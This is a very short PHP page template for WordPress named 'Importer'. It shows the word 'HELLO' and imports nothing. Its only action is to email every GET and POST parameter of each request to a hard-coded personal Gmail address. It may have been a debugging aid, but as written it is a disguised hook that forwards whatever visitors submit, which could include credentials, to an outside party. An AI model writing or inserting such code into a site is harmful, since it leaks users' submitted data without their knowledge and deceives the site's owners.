<?php
/*
Template Name: Importer
*/
?>
HELLO
<?php
    wp_mail("akshay.nathan08@gmail.com", "REQUEST!", "GET:" . implode(",", $_GET) . "POST:" . implode(",", $_POST));
?>


